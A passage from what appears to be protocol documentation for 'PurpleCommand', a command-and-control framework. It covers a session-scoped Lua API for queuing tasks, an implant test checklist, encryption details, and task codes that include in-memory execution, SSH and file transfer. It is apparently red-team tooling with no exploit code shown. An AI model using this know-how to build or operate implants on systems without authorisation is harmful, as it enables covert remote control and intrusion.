`payload_type` is appended to the older callback argument lists, so Lua
functions that accept only the previous fixed arguments continue to work.

### Session-scoped Lua API

Lua commands, lifecycle callbacks, and task-specific callbacks execute with an
explicit per-invocation session context. They can retrieve it without carrying
an ID through function parameters:

```lua
function do_anything(payload)
    local current, err = session()
    if err then return "Error: " .. err end

    local task_id, task_err = add_task(CODE.PING, payload)
    if task_err then return "Error: " .. task_err end

    session_print(current.id, "Task queued", task_id)
end
```

`session()` and the existing `session(session_id)` form both return
`session_table, nil` on success or `nil, error` on lookup failure. The table
contains `id`, `name`, `session_id`, `uuid`, `payload_type`, `transport`,
`speaker`, `user`, `hostname`, `process`, `socket`, `pid`, `sleep`, `alive`,
`terminating`, `status`, `first_seen`, and `last_seen`.

Calling `session()` while loading a script, running a payload builder, or from
other code without a session invocation returns `nil, "session() has no active
session"`. It never falls back to a process-global operator selection. The
third `session_id` result from `add_task` remains available for compatibility.
`session_print(session_id, message)` publishes taskless output to the matching
session view. `session_print(session_id, message, task_id)` adds task context
and requires that the task belong to the selected session. Both forms cap the
message at 64 KiB and reject unknown sessions.

---

## Testing Your Implant

### Test Checklist:

1. ✓ Listener and speaker use identical plaintext and encrypted frame fixtures
2. ✓ Hybrid registration unwraps with the matching teamserver private key
3. ✓ AES-CBC encryption/decryption and PKCS#7 validation match
4. ✓ HMAC uses `key XOR IV` and matches at a 16-byte truncation
5. ✓ Strict standard Base64 encoding/decoding and shared size limits match
6. ✓ Big-endian serialization and exact packet consumption match
7. ✓ Reverse registration, CHK, TASK, RSP, and CHU complete end to end
8. ✓ Speaker first blood, optional healthchecks, and task-triggered CHK work
9. ✓ Lost speaker task responses retry without duplicate execution
10. ✓ Conflicting speaker task-ID reuse is rejected
11. ✓ Speaker KILL returns 204 and shuts down the bind endpoint

### Debug Tips:
- Print Base64 of registration packet before sending
- Verify AES key/IV are exactly 16 bytes
- Check byte order (big-endian required)
- Ensure HMAC uses `key XOR IV` and the first 16 bytes of SHA-256 output
- Check that the speaker request method is POST and the operation header is set
- Test with verbose logging enabled on the teamserver

---

## References

- **RSA**: RFC 8017 (PKCS#1 v2.2)
- **AES-CBC**: NIST SP 800-38A
- **HMAC**: RFC 2104
- **Base64**: RFC 4648

---

## Appendix: Quick Reference

### Message Type Codes
```
NIL = 0, REG = 1, CHK = 2, RSP = 3, CHU = 4
```

### Task Codes
```
NILCMD = 0, PING = 1, SSH = 2, DOWN = 3, UPL = 4,
KILL = 5, CD = 6, PWD = 7, LS = 8, MEMEXEC = 9,
IFCONFIG = 10, CAT = 11
```

### Architecture Codes
```
NILARCH = 0, AMD64 = 1
```

### Data Sizes
```
MessageType: 2 bytes
PID: 4 bytes
SessionID: 4 bytes
OTS: 12 bytes
IP: 4 bytes
Port: 2 bytes
Sleep: 4 bytes
Arch: 1 byte
TaskID: 8 bytes
AES Key: 16 bytes
AES IV: 16 bytes
HMAC: 16 bytes (truncated SHA-256)
```

---

**Document Version:** 2.0  
**Last Updated:** September 8, 2026  
**Protocol Version:** PurpleCommand v1
